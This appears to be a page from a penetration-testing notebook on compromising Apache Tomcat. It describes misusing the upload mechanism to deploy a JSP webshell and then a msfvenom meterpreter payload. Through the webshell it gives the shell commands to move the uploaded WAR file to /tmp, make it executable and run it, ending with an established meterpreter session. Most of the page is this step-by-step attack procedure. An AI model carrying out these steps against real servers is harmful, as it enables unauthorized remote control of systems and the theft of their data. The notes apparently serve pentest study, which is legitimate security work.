<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Deploy a Webshell on the Target</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Deploy a Webshell on the Target</h1><br/><br /><strong><h3>Deploy webshells</h3></strong><span style="color:#1e90ff;"> (on the TARGET machine, in this case the one with Apache Tomcat)</span><br />Our purpose is to misuse the upload mechanism so we can obtain a fully functional reverse shell<br />First we have deploy a <a href="WebApp_Pentest--Vulnerability_assessment--Common_Vulnerabilities--Apache_Tomcat--Deploy_a_Webshell_on_the_Target--Build_webshell_with_jsp.html">jsp shell</a> and then deploy a <a href="p_Pentest--Vulnerability_assessment--Common_Vulnerabilities--Apache_Tomcat--Deploy_a_Webshell_on_the_Target--build_webshell_with_msfvenom.html">msfvenom webshell</a>. <br />Our final goal is to use the msfvenom webshell, but first we have to use the <strong>jsp shell</strong> to:<br />    1. rename meterpreterFile.war (msfvenom webshell) at its original form(without extension) because we have uploaded it in .war format<br />    2. make meterpreterFile executable<br /><br />To accomplish the two points above, we have to use the <span style="text-decoration:underline;">jsp shell</span>( remember that this a<strong> non-interactive webshell</strong> so we cannot &quot;cd&quot; but we have to use the command “ls”)<br />So we go to:<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">ls</span> -la <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>tomcat8<span style="color:#ff9d00;font-weight:700">/</span>webapps﻿</pre></div> <br />here probably we find the meterpreterFile.war that we have deployed from the admin page<br />now we have to rename it and move to the temporary folder /tmp<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">mv</span> <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>tomcat8<span style="color:#ff9d00;font-weight:700">/</span>webapps<span style="color:#ff9d00;font-weight:700">/</span>meterpreterFile.war <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>meterpreterFile</pre></div><br />file moved?<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">ls</span> -l <span style="color:#ff9d00;font-weight:700">/</span>tmp</pre></div><br />now we have to make it executable:<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">chmod</span> +x <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>meterpreterFile</pre></div><br />now we have to run it(always from the jsp webshell)<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>meterpreterFile</pre></div><br /><br /><br /><strong><h3>now the meterpreter session is established!</h3></strong><br /><a href=""><img src="images/352-1.png" alt="images/352-1.png" /></a><br /><a href=""><img src="images/352-2.png" alt="images/352-2.png" /></a></div>
</body>
</html>
